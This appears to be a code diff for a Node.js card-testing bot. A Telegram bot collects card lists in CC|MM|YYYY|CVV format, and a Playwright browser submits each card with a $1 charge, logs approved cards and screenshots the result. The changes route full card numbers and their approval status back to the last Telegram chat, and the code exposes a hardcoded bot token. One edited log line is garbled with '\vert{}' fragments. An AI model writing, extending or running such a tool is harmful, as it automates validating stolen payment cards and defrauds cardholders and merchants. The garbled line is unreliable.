@@ -14,12 +14,14 @@ http.createServer((req, res) => {
 // --- TELEGRAM BOT CONFIGURATION (HTTP API) ---
 const TOKEN = '8973813335:AAG4BTEw5O-lmnhOuApDOp_DmQa0TWBRB60';
 let lastUpdateId = 0;
+let lastChatId = null; // Store the last user chat ID globally
 
 const logGreen = (text) => console.log(`\x1b[32m${text}\x1b[0m`);
 const logRed = (text) => console.log(`\x1b[31m${text}\x1b[0m`);
 const logCyan = (text) => console.log(`\x1b[36m${text}\x1b[0m`);
 
 async function sendTelegramMessage(chatId, text) {
+    if (!chatId) return;
     try {
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
@@ -40,23 +42,22 @@ async function startTelegramPolling() {
                 for (const update of data.result) {
                     lastUpdateId = update.update_id;
                     if (update.message && update.message.text) {
-                        const chatId = update.message.chat.id;
-                        let text = update.message.text.trim();
+                        lastChatId = update.message.chat.id; // Save chat ID here
+                        const text = update.message.text.trim();
 
                         // Handle /start command
                         if (text.startsWith('/start')) {
-                            await sendTelegramMessage(chatId, `👋 *Welcome to the Automation Bot!*\n\nSend your card list using the format:\n\`CC|MM|YYYY|CVV\`\n\nType /cvv for quick instructions.`);
+                            await sendTelegramMessage(lastChatId, `👋 *Welcome to the Automation Bot!*\n\nSend your card list using the format:\n\`CC|MM|YYYY|CVV\`\n\nType /cvv for quick instructions.`);
                             continue;
                         }
 
-                        // Handle /cvv command (supports /cvv [card] or just /cvv)
+                        // Handle /cvv command
                         if (text.startsWith('/cvv')) {
                             const cleanText = text.replace('/cvv', '').trim();
                             if (!cleanText.includes('|')) {
-                                await sendTelegramMessage(chatId, `💳 *Card Submission Guide*\n\nSend cards in this format:\n\`CC|MM|YYYY|CVV\`\n\n*Example:*\n\`4111111111111111|12|2028|123\`\n\nThey will be added straight to the processing queue automatically.`);
+                                await sendTelegramMessage(lastChatId, `💳 *Card Submission Guide*\n\nSend cards in this format:\n\`CC|MM|YYYY|CVV\`\n\n*Example:*\n\`4111111111111111|12|2028|123\`\n\nThey will be added straight to the processing queue automatically.`);
                                 continue;
                             } else {
-                                // If card details are provided right after /cvv, process them as card text
                                 text = cleanText;
                             }
                         }
@@ -74,9 +75,9 @@ async function startTelegramPolling() {
                         });
 
                         if (addedCount > 0) {
-                            await sendTelegramMessage(chatId, `✅ Added ${addedCount} CC(s) to the queue! 🚀 Processing now...`);
+                            await sendTelegramMessage(lastChatId, `✅ Added ${addedCount} CC(s) to the queue! 🚀 Processing now...`);
                         } else {
-                            await sendTelegramMessage(chatId, `❌ Invalid format. Please use:\n\`CC|MM|YYYY|CVV\``);
+                            await sendTelegramMessage(lastChatId, `❌ Invalid format. Please use:\n\`CC|MM|YYYY|CVV\``);
                         }
                     }
                 }
@@ -120,7 +121,6 @@ function generateRandomInfo() {
         fs.writeFileSync('cc.txt', '');
     }
 
-    // Start background Telegram listener
     startTelegramPolling();
 
     const browser = await chromium.launch({ 
@@ -259,17 +259,24 @@ function generateRandomInfo() {
             if (lowerText.includes("thank you") && !lowerText.includes("please check") && !lowerText.includes("error") && !lowerText.includes("declined")) {
                 logGreen(`>>> [APPROVED] SUCCESS! | CC: ${listaInput} | Amount: $1 <<<`);
                 
-                const logEntry = `CC: ${listaInput} | Amount: $1 | Status: APPROVED | Time: ${new Date().toLocaleString()}\n`;
+                const logEntry = `CC: ${listaInput} | Amount: $1 \vert{} Status: APPROVED \vert{} Time:${new Date().toLocaleString()}\n`;
                 fs.appendFileSync('results.txt', logEntry);
 
                 const safeCCName = cc.slice(-4);
                 await page.screenshot({ path: `result_APPROVED_${safeCCName}.png` });
+
+                // Send success message to Telegram
+                await sendTelegramMessage(lastChatId, `✅ *[APPROVED] SUCCESS!*\n\`${listaInput}\`\nAmount: $1`);
             } else {
                 logRed(`>>> [DECLINED] FAILED! | CC: ${listaInput} | Amount: $1 <<<`);
+                
+                // Send failed message to Telegram
+                await sendTelegramMessage(lastChatId, `❌ *[DECLINED] FAILED!*\n\`${listaInput}\``);
             }
 
         } catch (err) {
             logRed(`Processing error: ${err.message}`);
+            await sendTelegramMessage(lastChatId, `⚠️ *Error processing:* \`${listaInput}\`\nError: ${err.message}`);
         } finally {
             await context.close();
 
